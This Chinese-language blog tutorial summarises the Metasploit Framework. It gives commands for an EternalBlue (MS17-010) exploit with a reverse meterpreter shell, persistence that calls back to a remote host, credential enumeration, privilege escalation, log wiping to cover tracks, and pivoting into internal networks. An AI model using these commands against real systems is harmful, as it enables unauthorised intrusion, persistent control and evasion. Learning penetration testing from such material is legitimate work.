---
title: HackTool MSF
url: 518.html
id: 518
date: 2018-06-16 00:00:00
tags:
---

[](https://www.diglp.xyz/2018/06/16/HackTool_MSF/#%E5%89%8D "前")前
-----------------------------------------------------------------

MSF 是 Metasploit Framework 的缩写, 可能是最著名的安全工具,没有之一了.

> Metasploit Framework 作为一个缓冲区溢出测试使用的辅助工具，也可以说是一个漏洞利用和测试平台。它集成了各平台上常见的溢出漏洞和流行的shellcode，并且不断更新，使得缓冲区溢出测试变得方便和简单。使用Metasploit安全测试工具在渗透测试中可以做很多事情，你可以保存你的日志、甚至定义每个有效负载在运行完成之后是如何将其自身清除的。

在这个 框架种,集成了大量的 Vector(攻击矢量), 和Payload(有效载荷), 使得渗透过程,变得简单易得.总之功能太多,这里作一个演示使用,和部分的功能,算是自己的一些总结.

* * *

*   MSF offical website
*   KALI Basic Command

[](https://www.diglp.xyz/2018/06/16/HackTool_MSF/#Do-it "Do it")Do it
---------------------------------------------------------------------

**注意,这部分内容有一定的攻击性,务必在法律允许范围内使用** 演示的话,就使用闹起轩然大波的 **MS17-010** 来吧, 方法简单, 效果粗暴. 如果我同样 把它称为, **永恒之蓝**, 估计就熟悉的多了.

    use exploit/windows/smb/ms17_010_eternalblue    # 攻击矢量set payload windows/meterpreter/reverse_tcp        # 有效载荷set rhost x.x.x.x    # 目标主机set lhost x.x.x.x    # 本地监听主机            exploit# 经过若干过程,得到shell

所以,可见,在MSF的框架里,对于一个exp的利用是变得如此的简单了. **基本术语**

*   攻击矢量 利用去渗透系统的东西
*   有效载荷 目标主机上实现可以利用的SHELL
*   反向连接 使得目标主机去主动链接我们的主机
*   正向链接 在目标主机开放端口,使得我们可愈长进行连接

[](https://www.diglp.xyz/2018/06/16/HackTool_MSF/#%E8%BF%9B%E9%98%B6-Shell-%E5%8A%9F%E8%83%BD "进阶 Shell 功能")进阶 Shell 功能
-----------------------------------------------------------------------------------------------------------------------

在 MSF 这个框架里面,其自带的 meterpreterde 这个 Shell, 功能是十分强大了 .自带了是有相当多的功能.这里只是简单的总结其中的部分了.

1.  shell 执行远程计算机的本地shell cmd
2.  getwd 当前目录
3.  upload / download 上传下载
4.  portfwd 实现端口转发, 比如 3389 不开外网,可以使用转发
5.  getgui -e 打开目标主机的 远程桌面  
    可以使用, rdesktop 进行远程桌面连接.
6.  route 扫描目标主机的路由表
7.  getuid 目标主机 shell 当前用户组
8.  sysinfo 目标主机的系统信息
9.  migrate 线程注入, 把shell的进程注入到其他的进程的远程线程中,  
    可能实现提权, 提高连接稳定性,不容易dead , 一般注入为, explorer.exe
10.  execute 目标主机上执行程序, -f 指定文件 , -H 可以使得后台执行, -i 实现交互模式. execute -H -m -d notepad.exe -f wce.exe -a “-o wce.txt”  
    -d 在目标主机执行时显示的进程名称（用以伪装）  
    -m 直接从内存中执行  
    “-o wce.txt”是wce.exe的运行参数  
    实现远程内存执行
    
11.  enum_drives 枚举驱动器
    
12.  checkvm 检测是否虚拟机
13.  persistence 权限维持 这个功能比较重要, persistence -X\[开机自启\] -i 5\[间隔\] -p 4444 -r 远程控制主机 从而实现, 开机启动,及自动的连接远程主机
    
14.  metsvc 一样的是权限维持, 实现了一个正向连接
    
15.  getsystem 实现系统提权
16.  enum_applications 枚举目标主机的所装软件
17.  dumplinks 目标主机近期的访问记录
18.  enum_ie 枚举IE的保存密码
19.  route 目标主机作为跳板,实现内网渗透.
20.  clearev 清除环境,和日志,以便逃跑

[](https://www.diglp.xyz/2018/06/16/HackTool_MSF/#%E8%BF%9B%E9%98%B6%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8 "进阶功能使用")进阶功能使用
------------------------------------------------------------------------------------------------------------------------

* * *

*   持久化控制
    
    *   使用 metsvc 服务启动建立正向连接服务
        
        *   使用其建立,一个正向链接,开放目标主机的端口,以便我们的控制链接,使用 metsvc\_bind\_tvp
            
                > run metvc -A> set payload windows/metsvc_bind_tcp
            

    -  persistence 启动项启动建立反向连接    -  运行 persistence 脚本让系统开机自启动 Meterpreter (-X)，10秒 (-i 10) 重连一次，使用端口为 6666(-p 6666)，连接的目的IP为 192.168.71.105             run persistence -X -i 10 -p 6666 \             -r 192.168.71.105  

* * *

*   内网渗透 在拿下目标主机之后, 把其作为跳板,进行更加深入的内网渗透.  
    外网的我们,我们无法直接向其内网中其他主机发起攻击，则可以借助已产生的meterpreter会话作为路由跳板，攻击内网其它主机。
    
    *   得到目标路由表
        
            > run get_local_subnets
        
        得到目标主机的路由表, 网段,和掩码
        
            > route print
        
    *   添加路由
        
        *   把目标主机作为一级路由, 使得我们可以进行目标主机子网域的渗透
            
                route add  192.168.249.0 255.255.255.0 5
            
            上面的是目标主机的 网段和掩码
            
    *   后渗透
        
        *   之后就可以对目标主机的子网进行渗透.

* * *

*   Payload 类型 对于Payload 的链接类型有 正向连接和反向连接。
    
    *   reverse_tcp Payload
        
            payload/windows/meterpreter/reverse_tcp
        
        反向连接，目标主机，对攻击机进行主动的连接
        
    *   bind_tcp Payload
        
            payload/windows/meterpreter/bind_tcp
        
        正向连接，因为在内网跨网段时无法连接到攻击主机，所以在内网中经常会使用。开放端口，等待攻击机连接。
        
    *   reverse_http/https Http 请求，实现异步，不需要进行TCP的长连接， 对于经常断线，网络不好情况。
        

* * *

*   端口转发 对于一些 目标端口，不对公网开开放， 我们进行端口转发，进行绕过。 portfrd
    
        portfwd add -l 4444 -p 3389 -r 127.0.0.1
    

[](https://www.diglp.xyz/2018/06/16/HackTool_MSF/#%E5%90%8E "后")后
-----------------------------------------------------------------

总之，msf 实在是神器，还有许许多多的功能，需要探索。提交进核心代码库也是理想吧。